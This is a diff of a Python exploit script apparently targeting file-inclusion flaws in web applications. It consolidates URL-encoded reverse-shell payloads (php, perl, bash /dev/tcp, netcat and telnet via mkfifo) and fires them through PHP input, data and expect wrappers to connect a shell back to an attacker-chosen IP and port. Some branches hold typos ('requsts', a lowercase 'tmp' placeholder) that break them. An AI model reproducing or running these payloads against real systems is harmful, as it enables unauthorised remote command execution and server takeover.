@@ -413,12 +413,17 @@ def exploit(exploits, method):
             #LINUX
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
+               
+                phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
+                perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
+                bashPayload = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
+                ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
+                telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
                 
                 #PHP
                 u = url.replace('TMP', 'which%20php')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/php' in res.text):
-                    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
                     printInfo(ip, port, 'PHP', 'input wrapper')
                     requests.post(url.replace('TMP', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
@@ -427,8 +432,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20perl')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/perl' in res.text):
-                    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
-                    
                     u = url.replace('TMP', perlPayload)
                     printInfo(ip, port, 'perl', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -438,7 +441,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20bash')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/bash' in res.text):
-                    bashPayload = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
                     u = url.replace('tmp', bashPayload)
                     printInfo(ip, port, 'bash', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -449,7 +451,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
                     u = url.replace('TMP', ncPayload)
                     printInfo(ip, port, 'nc', 'input wrapper')
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -459,7 +460,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20telnet')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/telnet' in res.text):
-                    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
                     u = url.replace('TMP', telnetPayload)
                     printInfo(ip, port, 'telnet', 'input wrapper')
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -488,7 +488,6 @@ def exploit(exploits, method):
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/php' in res.text):
                     printInfo(ip, port, 'PHP', 'data wrapper')
-                    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
                     requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
                     return
 
@@ -497,8 +496,6 @@ def exploit(exploits, method):
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/perl' in res.text):
                     printInfo(ip, port, 'perl', 'data wrapper')
-                    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
-
                     requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
                     return
 
@@ -507,7 +504,7 @@ def exploit(exploits, method):
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/bash' in res.text):
                     printInfo(ip, port, 'bash', 'data wrapper')
-                    u = url.replace('TMP', "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh")
+                    u = url.replace('TMP', bashPayload)
                     requests.get(u, headers = headers, proxies = proxies)
                     requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
 
@@ -518,7 +515,7 @@ def exploit(exploits, method):
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
                     printInfo(ip, port, 'nc', 'data wrapper')
-                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
+                    u = url.replace('TMP', ncPayload)
                     res = requests.get(u, headers = headers, proxies = proxies)
                     return
                 
@@ -526,7 +523,7 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20telnet')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/telnet' in res.text):
-                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port))
+                    u = url.replace('TMP', telnetPayload)
                     printInfo(ip, port, 'telnet', 'data wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
@@ -554,7 +551,6 @@ def exploit(exploits, method):
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/php' in res.text):
                     printInfo(ip, port, 'PHP', 'expect wrapper')
-                    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
                     requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
                     return
 
@@ -562,7 +558,6 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20perl')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/perl' in res.text):
-                    perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
                     printInfo(ip, port, 'perl', 'expect wrapper')
                     requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
                     return
@@ -571,7 +566,7 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20bash')
                 res = requsts.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/bash' in res.text):
-                    u = url.replace('TMP', "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh")
+                    u = url.replace('TMP', bashPayload)
                     printInfo(ip, port, 'bash', 'expect wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
@@ -581,7 +576,7 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port))
+                    u = url.replace('TMP', ncPayload)
                     printInfo(ip, port, 'nc', 'expect wrapper')
                     res = requests.get(u, headers = headers, proxies = proxies)
                     return
@@ -590,7 +585,7 @@ def exploit(exploits, method):
                 u = url.replace('TMP', 'which%20telnet')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/telnet' in res.text):
-                    u = url.replace('TMP', "")
+                    u = url.replace('TMP', telnetPayload)
                     printInfo(ip, port, 'telnet', 'expect wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
@@ -691,7 +686,7 @@ def main():
         test_rfi(url)
 
     print("Done.")
-    exit(0)
+    sys.exit(0)
 
 if(__name__ == "__main__"):
     
